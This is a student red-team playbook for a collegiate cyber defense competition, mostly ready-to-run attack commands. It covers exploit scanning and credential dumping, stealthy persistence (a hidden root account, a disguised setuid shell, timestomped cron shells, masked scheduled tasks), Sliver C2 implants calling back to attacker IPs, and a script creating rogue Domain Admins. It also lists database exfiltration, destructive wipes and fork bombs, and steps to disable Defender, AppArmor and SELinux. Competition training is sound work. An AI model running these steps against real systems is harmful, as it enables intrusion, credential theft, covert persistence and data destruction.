---
layout: blank
pagetitle: Red Teaming for CCDC
---

**CCDC playbook**
- Make sure to have a sheet with all host/shell info, so if we lose a shell we know where we lost it
- Opening Salvo:
  - Quickly nmap scan for port 445, as this will almost always be our gateway in
  - `nmap -sV -O -T4 -min-hostgroup 96 -p 445 --open {IP_range}`
    - `-min-hostgroup` will divide the range up into 96 sup parts
  - Simultaneously run a scan for all port 22s (so we can use them when we find the default password)
    - `nmap -sV -O -T4 -min-hostgroup 96 -p 22 {IP_range}`
  - Additionally, one final `nmap -sn -T4 10.10.0.1/24 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > ips.txt` to just figure out what hosts are online
  - Then pass alive hosts to autorecon with `sudo autorecon -t ips.txt -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,636,873,993,995,1025-1030,1080,1433,1521,1723,3306,3389,5432,5900,5985,6379,6667,8000,8080,8443,8888 -o autorecon_results --max-scans 100`
  - Then, run `while read -r line; do nxc smb $line -u '' -p '' -M zerologon -M printnightmare -M smbghost -M ms17-010; done < ips.txt` against all IPs
    - If we get a hit, run `zerologon.py` and then `impacket-secretsdump -just-dc-user {target_domain_user} {domain}/{admin_username}:"{password}"@{DC_IP}`
      - e.g. `impacket-secretsdump -just-dc -no-pass 'corp.local/TEST-DC$@10.10.0.162'` (DC name is TEST-DC)

- **Persistence:**
  - Linux:
    - Add SSH keys
      - `mkdir /root/.ssh` and add key to `/root/.ssh/authorized_keys`
    - Modify `/etc/passwd` and `/etc/ssh/sshd_config`
      - `echo 'wwwdata:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd && chattr +i /etc/passwd && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && chattr +i /etc/ssh/sshd_config`
    - Use setuid binaries in weird locations (like a fake .kernel file):
      - `cp /bin/zsh /.kernel && chmod +sss /.kernel && touch -d "4 May 2024" /.kernel && chattr +i /.kernel`
      - `chattr` makes the file immutable (even as ROOT????)
        - We could also use this to add permanent persistence to /etc/passwd or /etc/shadow :o
    - Cron jobs:
      - Make innocuous cron jobs that are just shells sending out continuous connections
      - Upload shell to `/etc/cron.hourly/locate`, `touch -d "12 Jul 2024" /etc/cron.hourly/locate` to make it non-sus, and `chattr +i /etc/cron.hourly/locate`
        - Has to start with a `#!/bin/bash`
  - Windows:
    - When installing the exes, make sure to use `-o` with `iwr` or we'll just get the HTTP connection info lmfao
    - Scheduled tasks: `persistence install --method schtask --name "WindowsUpdate" --interval 600 --hidden`
    - Registry (run on login?): `persistence install --method registry --name svchost`
    - WMI: `persistence install --method wmi --name "WindowsWMIUpdate"`
    - Services: `sc create MySvc binPath= "C:\Path\to\implant.exe" start= auto`
    - Startup:
      - Add script to `C:\Windows\System32\GroupPolicy\User\Scripts\Logon\`
      - Runs on user login: `$path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.lnk"`
    - Backdooring domain:
      - `./mass_user_add_local.sh`
        - This adds a bunch of users to the domain
    - MSSQL server:
      - Theoretically, we could set up an additional MSSQL server in order
- Web apps:
  - Get in, change passwords, modify something about the web app or use it for access

**AutoRecon**
- Command to run at the start of competition: `sudo autorecon {IP_range} -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,636,873,993,995,1025-1030,1080,1433,1521,1723,3306,3389,5432,5900,5985,6379,6667,8000,8080,8443,8888 -o autorecon_results --max-scans 100 --heartbeat 30`
  - If we want, we can `nmap -sn {IP_range}` and pass the alive hosts into `-t alive-hosts.txt`
- Overall status: `find autorecon_results -name "*.txt" -type f -exec grep -l "open" {} \; | sort`
- Common vulns: `grep -r "MS17-010\|CVE-\|Anonymous\|Password:" autorecon_results`
- Anonymous access: `grep -r "Anonymous" autorecon_results`
- Find DC: `grep -r "Domain Controller" autorecon_results`
- Passwords: `grep -r "Password:\|Credentials:" autorecon_results`
- Missing SMB signing: `grep -r "SMB signing required: false" autorecon_results`

**Sliver**
- Can build from source with `sudo apt install golang-go`, `curl https://sliver.sh/install | sudo bash`, and `cd sliver && make`
- To make sure we don't kill the mf server, let's operate from a client
  - Start up tmux and run `sliver-server`
  - On the server: `new-operator --name malfuncti0nal --lhost localhost` and `multiplayer` to enable clients
  - On the client, outside of tmux: `sliver-client import {config_file}` and `sliver-client` to join
- `mtls` can be used to start listening for incoming sessions
- Then, use `generate` to create implants or beacons
  - `generate --mtls {our_IP} --os linux` for an implant
  - `generate beacon --mtls 10.10.0.171 -j {jitter} -S {wait_seconds} --os linux` 
  - Windows: `generate --mtls 10.10.0.171 --os windows --arch x64 --format exe ` 
- `sessions` to show active sessions
  - `sessions -i {id}` to interact with session
    - `CTRL + d` to exit
    - `shell {command}` will execute command in a session (can maybe run without `shell`?)
    - `getprivs` will list privileges available, probably use /ProgramData/ for potatoes?
    - `info` - host info
    - `ps` - process list
    - `upload`/`download` - file transfer
    - `screenshot` - grab a screenshot
- `beacons` to show active beacons
  - `use {beacon_id}` to use a beacon
    - `interactive` to turn it into a normal session
- Armory:
  - Install all with `armory install all`
  - Sharphound: `sharp-hound-4 -- '-c all,GPOLocalGroup'`shs

**Killing Services**
- Soft breaks:
  - `systemctl stop {service}` 
    - This is too kind, we shant do this :>
  - Edit service configs
  - Drop 50% of incoming firewall packets
  - Reset default credentials
- Hard breaks:
  - Delete configs
  - Destructive firewall rules
  - Remove scoring assets
  - Delete entire binaries/files
- Nukes:
  - `rm -rf / -no-preserve-root`
  - `del /Q /S`
  - Fork bombing (`:(){ :|:& };:`)
  - Corrupt bootloader partition (oh my god this is evil)

**Misc**
- Windows:
  - Shutdown: `shutdown /s /t 0`
  - Reboot: `shutdown /r /t 0`
  - Logoff user:
    - `query session` and `logoff {id}` to log off a specific user
  - Powershell save path: `(Get-PSReadlineOption).HistorySavePath`
- Linux:
  - `reboot` to restart
  - `who` to see who's on a system
  - `pkill -KILL -u {user}` - kill all of a user's processes
  - `kill -9 {pid}` to kill a specific process
- Machine IPs:
  - Kali1: 10.10.0.171
  - Kali2: 10.10.0.184
  - Ubuntu: 10.10.0.181
  - Windows 10.10.0.136
- Set date: `touch -d "4 May 2024"`


**Databases**
- Exploitation:
  - Keep an eye out for older servers( MySQL 5.6/5.7, PostgreSQL 9.x, SQL Server 2012/2014)
- Exfil:
  - MySQL: `mysqldump -h [host] -u [user] -p[password] --all-databases > mysql_all_dbs.sql`
  - PostgreSQL: `pg_dump -h [host] -U [username] -F c -b -v -f postgresql_all.dump postgres`
  - MSSQL (table names): `Invoke-Sqlcmd -ServerInstance [server] -Username [user] -Password [password] -Query "SELECT name FROM master.sys.databases" | Format-Table -AutoSize > mssql_dbs.txt`
  - Oracle: `sqlplus [username]/[password]@[host]/[SID] @extract.sql > oracle_data.txt`
  - MongoDB: `mongodump --host [host] --port [port] --username [user] --password [password] --out ./mongodb_dump`

**Trolling**
- alias binaries :>
  - `echo "alias cd='echo access denied'" >> ~/.bashrc`
- wall
  - `wall "System update: please wiggle your mouse to avoid data loss.`
- login messages:
  - `echo "WARNING: This system is monitored by a mildly annoyed squirrel." > /etc/motd`
- Make all files immutable:
  - `find . -type f -exec chattr +i {} +`
- Set all computers to same background:
  - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`

**Todo:**
- Practice using sliver for session management
- Make windows persistence script? If we can get sliver working, this should be taken care of
- 

**Ideas:**

```
Import-Module ActiveDirectory
$N = 50
$outputFile = ".\created_users.txt"
"" > $outputFile  

for ($i = 1; $i -le $N; $i++) {
    $username = -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
    $password = "Kh43lWuzH3r3"
    $securePass = ConvertTo-SecureString $password -AsPlainText -Force

    New-ADUser -Name $username -SamAccountName $username -AccountPassword $securePass -Enabled $true
    Add-ADGroupMember -Identity "Domain Admins" -Members $username

    "$username : $password" | Out-File -Append $outputFile
}
```

**Defender/AppArmor/SELinux**
- Defender:
  - Disable with:
    - `reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`
    - `gpedit.msc` > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Turn off Microsoft Defender Antivirus > Enabled
    - Powershell:
      - `C:\Program Files\Windows Defender\MpCmdRun.exe -RemoveDefinitions -All`
      - `Set-MpPreference -DisableRealtimeMonitoring $true`
      - `Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI`
      - `Stop-Service WinDefend -Force`
      - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force`
      - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" -Name "AllowAntivirus" -Value 0 -Type DWord`
    - Then reboot?
  - Bypassing with FilelessPELoader:
    - `https://github.com/SaadAhla/FilelessPELoader`
    - Can load from memory
- AppArmor:
  - `sudo systemctl stop apparmor`, `sudo systemctl disable apparmor`, `sudo apt purge apparmor`
- SELinux:
  - Status with `sestatus`
  - Temp disable: `sudo setenforce 0` or `sudo setenforce permissive`
  - Permanent disable: set `SELINUX=enforcing` to `disabled` in `/etc/selinux/config` and reboot